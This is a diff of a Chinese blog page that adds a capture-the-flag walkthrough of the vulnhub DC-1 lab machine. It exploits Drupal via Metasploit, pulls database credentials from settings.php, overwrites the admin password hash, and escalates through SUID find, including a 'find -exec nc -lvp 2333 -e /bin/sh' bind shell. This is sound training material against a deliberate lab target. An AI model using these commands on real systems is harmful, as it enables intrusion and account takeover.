@@ -53,18 +53,61 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
     var CONFIG = {"hostname":"www.idefun.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true,"b2t":false,"scrollpercent":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="IdeFun的小破站,记录生活,分享知识">
-<meta property="og:type" content="website">
-<meta property="og:title" content="IdeFun">
-<meta property="og:url" content="http://www.idefun.com/tags/github-action/index.html">
+  <meta name="description" content="基于vulnhub的DC-1靶机的渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于vulnhub的DC-1靶机的渗透测试">
+<meta property="og:url" content="http://www.idefun.com/article/64755983.html">
 <meta property="og:site_name" content="IdeFun">
-<meta property="og:description" content="IdeFun的小破站,记录生活,分享知识">
+<meta property="og:description" content="基于vulnhub的DC-1靶机的渗透测试">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/05/01/grdcAYKiPbMNpV7.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501205202.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501212931.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501213056.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501213136.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501213221.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501113313.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501113754.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501215026.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501144842.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501215550.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501224120.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501224144.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501224525.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501225506.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501225936.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501230108.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501230609.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501230659.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210501231119.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502090130.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502090619.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502090808.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502091533.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502091605.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502092100.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502092505.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502092551.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502092737.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502093157.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502093233.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502093329.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502093407.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502093825.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502094002.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502095721.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502094419.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502095521.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502095600.png">
+<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/20210502095637.png">
+<meta property="article:published_time" content="2021-05-02T02:01:48.000Z">
+<meta property="article:modified_time" content="2021-05-02T02:06:40.962Z">
 <meta property="article:author" content="IdeFun">
-<meta property="article:tag" content="IdeFun,信息安全,教程,blog,c,c++,解决github无法访问的问题,hack学习,linux知识总结,mysql,shell,Web,python,汇编环境完美搭建,日志,www.idefun.com,idefun.com,next主题实现双语功能">
+<meta property="article:tag" content="Hack">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/01/grdcAYKiPbMNpV7.png">
 
-<link rel="canonical" href="http://www.idefun.com/tags/github-action/">
+<link rel="canonical" href="http://www.idefun.com/article/64755983.html">
 
 
 <script id="page-configurations">
@@ -72,7 +115,7 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
@@ -87,7 +130,7 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
     })();
 </script>
 
-  <title>标签: github action | IdeFun</title>
+  <title>基于vulnhub的DC-1靶机的渗透测试 | IdeFun</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0WRGPLW2R"></script>
     <script>
@@ -279,57 +322,309 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
         <div class="content-wrap">
           
 
-          <div class="content tag">
+          <div class="content post posts-expand">
             
 
+    
   
   
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.idefun.com/article/64755983.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://i.loli.net/2021/01/05/Gf1qZ9szBp7tISF.jpg">
+      <meta itemprop="name" content="IdeFun">
+      <meta itemprop="description" content="IdeFun的小破站,记录生活,分享知识">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="IdeFun">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          基于vulnhub的DC-1靶机的渗透测试
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <i class="fa fa-thumb-tack"></i>
+            <font color=7D26CD>置顶</font>
+            <span class="post-meta-divider">|</span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-02 10:01:48 / 修改时间：10:06:40" itemprop="dateCreated datePublished" datetime="2021-05-02T10:01:48+08:00">2021-05-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hack/" itemprop="url" rel="index"><span itemprop="name">Hack</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
   
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">github action
-          <small>标签</small>
-        </h2>
-      </div>
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/64755983.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/64755983.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+            <div class="post-description">基于vulnhub的DC-1靶机的渗透测试</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2021</span>
+        <h1 id="基于vulnhub的DC-1靶机的渗透测试"><a href="#基于vulnhub的DC-1靶机的渗透测试" class="headerlink" title="基于vulnhub的DC-1靶机的渗透测试"></a>基于vulnhub的DC-1靶机的渗透测试</h1><a id="more"></a>
+<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>靶机下载:<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
+<p>DC1需要找到5个flag,最终目标是在root的主目录中找到并读取该标志！</p>
+<p>kali要桥接</p>
+<p><img src="https://i.loli.net/2021/05/01/grdcAYKiPbMNpV7.png" alt=""></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看kali的IP</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501205202.png" alt=""></p>
+<p>发现IP为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.101</span><br></pre></td></tr></table></figure>
+<p>使用nmap扫描靶机IP</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501212931.png" alt=""></p>
+<p>其中192.168.1.107是我本机IP,则靶机可能的IP为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.102</span><br><span class="line">192.168.1.103</span><br><span class="line">192.168.1.106</span><br></pre></td></tr></table></figure>
+<p>接下来ping测试</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213056.png" alt=""></p>
+<p>发现192.168.1.103和192.168.1.106ping不通,则靶机ip为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.102</span><br></pre></td></tr></table></figure>
+<p>继续查看端口开放状态</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 192.168.1.102 -p- --min-rate=2000 -n -vv </span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213136.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213221.png" alt=""></p>
+<p>发现开放了22端口(ssh),80端口(http),111和60431端口,并且采用的是Drupal 7框架,有个robots.txt</p>
+<h2 id="边界突破"><a href="#边界突破" class="headerlink" title="边界突破"></a>边界突破</h2><p>访问网站</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501113313.png" alt=""></p>
+<p>判断为动态网站</p>
+<p>查看robots.txt</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501113754.png" alt=""></p>
+<p>没有发现有用的信息</p>
+<p>目录扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.102</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501215026.png" alt=""></p>
+<p>发现几个可疑目录</p>
+<p>admin,root,user,/includes/Root,访问后如下</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501144842.png" alt=""></p>
+<p>使用Metasploit framework搜索Drupal</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501215550.png" alt=""></p>
+<p>尝试利用第一个</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_coder_exec </span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224120.png" alt=""></p>
+<p>接下来需要配置rhost,如果第一次使用可能需还要配置lhost和lport,即监听机的ip和端口</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224144.png" alt=""></p>
+<p>然后<code>exploit</code> 或者 <code>run</code></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224525.png" alt=""></p>
+<p>发现失败了</p>
+<p>尝试第二个,发现成功</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501225506.png" alt=""></p>
+<p>执行命令shell命令获得shell</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501225936.png" alt=""></p>
+<p>使用python反弹shell,获得更好的交互体验</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230108.png" alt=""></p>
+<p>使用<code>ls</code>查看当前目录下文件</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230609.png" alt=""></p>
+<p>发现有个flag1.txt文件,使用cat命令查看</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230659.png" alt=""></p>
+<p>flag1:“每一个好的内容管理系统 都需要一个配置文件”——配置文件里面肯定有东西</p>
+<p>进入sites/dafault,发现有个settings.php</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501231119.png" alt=""></p>
+<p>查看settings.php</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090130.png" alt=""></p>
+<p>发现flag2</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag2</span><br><span class="line">Brute force and dictionary attacks aren&#39;t the</span><br><span class="line">only ways to gain access (and you WILL need access).</span><br><span class="line">What can you do with these credentials?</span><br></pre></td></tr></table></figure>
+<p>同时发现数据库的库名(drupaldb),用户名(dbuser)和密码(R0ck3t)</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090619.png" alt=""></p>
+<p>尝试登录数据库</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"><span class="meta">#</span><span class="bash"> 登陆数据库</span></span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 drupaldb 数据库</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090808.png" alt=""></p>
+<p>查询users表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502091533.png" alt=""></p>
+<p>发现有两个用户admin和Fred,但密码经过加密</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502091605.png" alt=""></p>
+<p>退出数据库,尝试修改admin的密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/</span><br><span class="line">php scripts/password-hash.sh 123 &gt; pwd.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">将123通过哈希加密</span></span><br><span class="line">cat pwd.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092100.png" alt=""></p>
+<p>得到’123’哈希加密后的密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$S$D0jEFt4XLx.7zA5.tCIDN2GBMsL2W6jtMxr6fE7Lt&#x2F;Mct6ctCkqD</span><br></pre></td></tr></table></figure>
+<p>进入数据库,修改admin密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入数据库</span></span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 drupaldb 数据库</span></span><br><span class="line">update users set pass = &#x27;$S$D0jEFt4XLx.7zA5.tCIDN2GBMsL2W6jtMxr6fE7Lt/Mct6ctCkqD&#x27; where name = &#x27;admin&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将密码改为123</span></span><br><span class="line">truncate flood;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果错误密码太多被锁定的话，这条语句可以解除锁定</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092505.png" alt=""></p>
+<p>此时查看users表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<p>可见admin的密码已经修改为123哈希加密后的密码</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092551.png" alt=""></p>
+<p>登录网站后台</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092737.png" alt=""></p>
+<p>登录成功</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093157.png" alt=""></p>
+<p>点击Find content</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093233.png" alt=""></p>
+<p>发现flag3,点击edit查看</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093329.png" alt=""></p>
+<p>得到flag3</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line"><span class="meta">#</span><span class="bash">提示我们使用find执行操作</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093407.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093825.png" alt=""></p>
+<p>未发现有用的信息,查看/etc/passwd</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>发现有个flag4的用户</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502094002.png" alt=""></p>
+<p>进入flag4目录,发现有个flag4.txt,查看得到flag4</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095721.png" alt=""></p>
+<p>flag4</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+<p>接下来尝试获取最终flag</p>
+<p>方法一:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find ./ aaa -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure>
+<p>得到root权限</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502094419.png" alt=""></p>
+<p>方法二:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find flag4.txt -exec nc -lvp 2333 -e /bin/sh \;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机开启监听</span></span><br><span class="line">nc 192.168.1.102 2333</span><br><span class="line"><span class="meta">#</span><span class="bash">渗透主机连接shell</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095521.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095600.png" alt=""></p>
+<p>查看/root目录</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095637.png" alt=""></p>
+<p>得到thefinalflag</p>
+
     </div>
 
-  <article class="my-post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="my-post-header">
+   
 
-      <div class="my-post-meta">
-        <time class="my-post-time" itemprop="dateCreated"
-              datetime="2021-03-07T18:34:23+08:00"
-              content="2021-03-07">
-          03-07
-        </time>
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="IdeFun 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="IdeFun 支付宝">
+        <p>支付宝</p>
       </div>
 
-      <div class="my-post-title">
-          <a class="my-post-title-link" href="/article/a1a28d7.html" itemprop="url">
-            <span itemprop="name">教你定时发送天气邮件</span>
-          </a>
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>IdeFun
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.idefun.com/article/64755983.html" title="基于vulnhub的DC-1靶机的渗透测试">http://www.idefun.com/article/64755983.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <div>
+        
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+        
       </div>
 
-    </header>
-  </article>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Hack/" rel="tag"><i class="fa fa-tag"></i> Hack</a>
+          </div>
 
+        
+  <div class="post-widgets">
+    <div class="wp_rating">
+      <div id="wpac-rating"></div>
     </div>
   </div>
-  
-  
-  
 
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/ab23bf02.html" rel="prev" title="http cookies劫持实验">
+      <i class="fa fa-chevron-left"></i> http cookies劫持实验
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
   
 
 
 
           </div>
           
+    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -378,6 +673,7 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Evulnhub%E7%9A%84DC-1%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-text">基于vulnhub的DC-1靶机的渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%87%86%E5%A4%87"><span class="nav-text">实验准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4"><span class="nav-text">边界突破</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -406,7 +702,7 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -699,13 +995,13 @@ if(canvas.getContext){
     </div>
     <ul class="links-of-recent-posts-list">
         <li class="links-of-recent-posts-item">
+          <a href="/article/64755983.html" title="article&#x2F;64755983.html">基于vulnhub的DC-1靶机的渗透测试</a>
+        </li>
+        <li class="links-of-recent-posts-item">
           <a href="/article/ab23bf02.html" title="article&#x2F;ab23bf02.html">http cookies劫持实验</a>
         </li>
         <li class="links-of-recent-posts-item">
           <a href="/article/d0f0a8c5.html" title="article&#x2F;d0f0a8c5.html">基于vulnhub的Chill_Hack靶机的渗透测试</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/article/2797960d.html" title="article&#x2F;2797960d.html">hexo next主题添加日历云</a>
         </li>
     </ul>
   </div>
@@ -911,6 +1207,59 @@ translateInitilization();
   
 
   
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
